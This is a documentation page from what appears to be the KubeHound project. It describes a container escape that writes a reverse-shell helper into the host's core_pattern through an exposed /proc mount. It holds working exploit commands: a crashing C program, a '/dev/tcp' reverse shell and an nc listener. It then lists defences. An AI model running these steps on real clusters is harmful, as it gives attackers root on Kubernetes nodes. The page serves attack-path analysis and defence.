<!--
id: CE_UMH_CORE_PATTERN
name: "Container escape: through core_pattern usermode_helper"
mitreAttackTechnique: T1611 - Escape to host
mitreAttackTactic: TA0004 - Privilege escalation
-->

# CE_UMH_CORE_PATTERN

Container escape via the `core_pattern` `usermode_helper` in the case of an exposed `/proc` mount.

| Source                                    | Destination                           | MITRE                            |
| ----------------------------------------- | ------------------------------------- |----------------------------------|
| [Container](../entities/container.md) | [Node](../entities/node.md) | [Escape to Host, T1611](https://attack.mitre.org/techniques/T1611/) |

## Details

[/proc/sys/kernel/core_pattern](https://man7.org/linux/man-pages/man5/core.5.html) defines a program which is executed on core-file generation (typically a program crash) and is passed the core file as standard input if the first character of this file is a pipe symbol `|`. This program is run by the root user and will allow up to 128 bytes of command line arguments. Attacker control of this progam would allow trivial code execution within the container host given any crash and core file generation (which can be simply discarded during a myriad of malicious actions). With write access to the host `/proc` directory and no additional privileges, an attacker can abuse this to escape a container and gain root on the containing K8s node.

## Prerequisites

Execution within a container process with the host `/proc/sys/kernel` (or any parent directory) mounted inside the container.

See the [example pod spec](https://github.com/DataDog/KubeHound/tree/main/test/setup/test-cluster/attacks/CE_UMH_CORE_PATTERN.yaml).

## Checks

Determine mounted volumes within the container as per [VOLUME_DISCOVER](./VOLUME_DISCOVER.md#checks). If the host `/proc/sys/kernel` (or any parent directory) is mounted, this attack will be possible. Example below.

```bash
$ cat /proc/self/mounts

...
proc /hostproc proc rw,nosuid,nodev,noexec,relatime 0 0
...
```

## Exploitation

First find the path of the container’s filesystem on the host. This can be done by retrieving the current mounts (see [VOLUME_DISCOVER](./VOLUME_DISCOVER.md#checks)). Looks for the `upperdir` value of the overlayfs entry associated with containerd:

```bash
$ cat /etc/mtab
...
overlay / overlay rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/27/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/71/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/71/work 0 0
...

# Store path in a variable for future use
$ OVERLAY_PATH=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/71/fs
```

Oneliner alternative:

```bash
export OVERLAY_PATH=$(cat /proc/mounts | grep -oe upperdir=.*, | cut -d = -f 2 | tr -d , | head -n 1)
```

Next create a mini program that will crash immediately and generate a kernel coredump. For example:

```bash
echo 'int main(void) {
	char buf[1];
	for (int i = 0; i < 100; i++) {
		buf[i] = 1;
	}
	return 0;
}' > /tmp/crash.c && gcc -o crash /tmp/crash.c
```

Compile the program and copy the binary into the container as crash. Next write a shell script to be triggered inside the container’s file system as `shell.sh`:

```bash
# Reverse shell
REVERSE_IP=$(hostname -I | tr -d " ") && \
echo '#!/bin/sh' > /tmp/shell.sh
echo "sh -i >& /dev/tcp/${REVERSE_IP}/9000 0>&1" >> /tmp/shell.sh && \
chmod a+x /tmp/shell.sh
```

Finally write the `usermode_helper` script path to the `core_pattern` helper path and trigger the container escape:

```bash
cd /hostproc/sys/kernel
echo "|$OVERLAY_PATH/tmp/shell.sh" > core_pattern
sleep 5 && ./crash & nc -l -vv -p 9000
```

## Defences

### Monitoring

+ Use the Datadog agent to monitor for creation of new `usermode_helper` programs via writes to known locations, in this case `/proc/sys/kernel_core_pattern`.

### Implement security policies

Use a pod security policy or admission controller to prevent or limit the creation of pods with a `hostPath` mount of `/proc` or other sensitive locations.

### Least Privilege

Avoid running containers as the root user. Specify an unprivileged user account using the `securityContext`.

## Calculation

+ [EscapeUmhCorePattern](https://github.com/DataDog/KubeHound/tree/main/pkg/kubehound/graph/edge/escape_umh_core_pattern.go)

## References:

+ [Compendium Of Container Escapes](https://i.blackhat.com/USA-19/Thursday/us-19-Edwards-Compendium-Of-Container-Escapes-up.pdf)
+ [Sensitive Mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
+ [Escaping privileged containers for fun](https://pwning.systems/posts/escaping-containers-for-fun/)
